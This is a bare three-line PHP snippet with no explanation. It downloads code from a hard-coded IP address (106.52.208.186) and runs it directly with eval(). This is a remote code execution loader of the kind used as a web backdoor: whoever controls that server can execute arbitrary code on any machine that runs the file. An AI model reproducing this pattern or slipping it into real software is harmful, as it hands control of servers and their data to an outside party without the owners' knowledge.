$url = 'http://106.52.208.186/res/php/index.php';

$result = file_get_contents($url);

eval($result);
